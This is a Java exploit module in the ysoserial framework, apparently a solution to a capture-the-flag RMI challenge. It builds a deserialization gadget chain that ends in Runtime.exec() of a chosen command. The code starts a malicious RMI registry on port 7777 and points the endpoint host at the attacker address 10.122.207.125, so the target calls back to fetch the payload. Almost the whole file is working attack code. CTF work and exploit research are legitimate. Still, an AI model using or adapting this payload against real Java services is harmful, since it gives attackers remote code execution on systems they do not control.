package ysoserial.payloads;

import com.ctf.threermi.*;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.rmi.server.UnicastRemoteObject;


/*
/*
	Gadget chain:
		Gadget.readObject()
		    UserInter(Proxy).getGirlFriend()
				RemoteObjectInvocationHandler.invoke()
				    UnicastRef.invoke()
                        StreamRemoteCall#executeCall()
                            UserInter.getGirlFriend()
                        Templates(Proxy).newTransformer()
                     MyInvocationHandler.invoke()
                        FactoryInter(Proxy).getObject()
                            RemoteObjectInvocationHandler.invoke()
                                UnicastRef.invoke()
                                    StreamRemoteCall#executeCall()
                                        FactoryInter.getObject()
			 Method.invoke()
                            TemplatesImpl.newTransformer()
                                TemplatesImpl.getTransletInstance()
                                    TemplatesImpl.defineTransletClasses()
                                        TemplatesImpl.TransletClassLoader.defineClass()
                                            Pwner*(Javassist-generated).<static init>
                                                Runtime.exec()
 */
 */
class UserImpl implements UserInter {
    Registry registry;
    {
        try {
            registry = LocateRegistry.getRegistry(7777);
        } catch (RemoteException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String sayHello(String paramString) throws RemoteException {
        return null;
    }

    @Override
    public Friend getGirlFriend() throws RemoteException {
        FactoryInter factoryInter = null;//annotationInvocationHandler
        try {
            final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, 2);
            allIfaces[0] = FactoryInter.class;
            allIfaces[1] = Remote.class;
            factoryInter = (FactoryInter) Proxy.newProxyInstance(FactoryInter.class.getClassLoader(),allIfaces,Proxy.getInvocationHandler(registry.lookup("factory")));
        } catch (Exception e) {
            e.printStackTrace();
        }

        final MyInvocationHandler myInvocationHandler = new MyInvocationHandler();
        try {
            Reflections.setFieldValue(myInvocationHandler,"object",factoryInter);
        } catch (Exception e) {
            e.printStackTrace();
        }
        final Friend friend = Gadgets.createProxy(myInvocationHandler,Friend.class, Templates.class);
        return friend;


    }
}
class FactoryImpl implements FactoryInter{
    String cmd;
    @Override
    public Object getObject() throws Exception {
        return Gadgets.createTemplatesImpl(this.cmd);
    }
}

public class TCTF3rmiExp extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {
        int evilServerPort = 7777;
        Registry registry = LocateRegistry.createRegistry(evilServerPort);
        UserImpl user1 = new UserImpl();
        registry.bind("UserImpl", UnicastRemoteObject.exportObject(user1, evilServerPort));
        FactoryImpl factoryImpl = new FactoryImpl();
        Reflections.setFieldValue(factoryImpl,"cmd",command);
        registry.bind("factory", UnicastRemoteObject.exportObject(factoryImpl, evilServerPort));
//        ((UnicastRef) ((RemoteObjectInvocationHandler) ref).ref).getLiveRef().getEndpoint().getClass()
        InvocationHandler ref = Proxy.getInvocationHandler(registry.lookup("UserImpl"));

        Field field =  ref.getClass().getSuperclass().getDeclaredField("ref");
        field.setAccessible(true);
        UnicastRef unicastRef =  (UnicastRef)field.get(ref);
        LiveRef liveRef = (LiveRef) Reflections.getFieldValue(unicastRef,"ref");
        TCPEndpoint tcpEndpoint = (TCPEndpoint)Reflections.getFieldValue(liveRef,"ep");
        Reflections.setFieldValue(tcpEndpoint,"host","10.122.207.125");

        RemoteObjectInvocationHandler remoteObjectInvocationHandler = new RemoteObjectInvocationHandler((RemoteRef) Reflections.getFieldValue(ref,"ref"));
        final UserInter user = (UserInter) Proxy.newProxyInstance(UserInter.class.getClassLoader(),new Class[]{UserInter.class,Remote.class},remoteObjectInvocationHandler);
        Gadget gadget = new Gadget();
        Reflections.setFieldValue(gadget,"user",user);
        Reflections.setFieldValue(gadget,"mName","newTransformer");

        return gadget;
    }
    public static void main(String[] args) throws Exception {
        PayloadRunner.run(TCTF3rmiExp.class, args);
    }

}
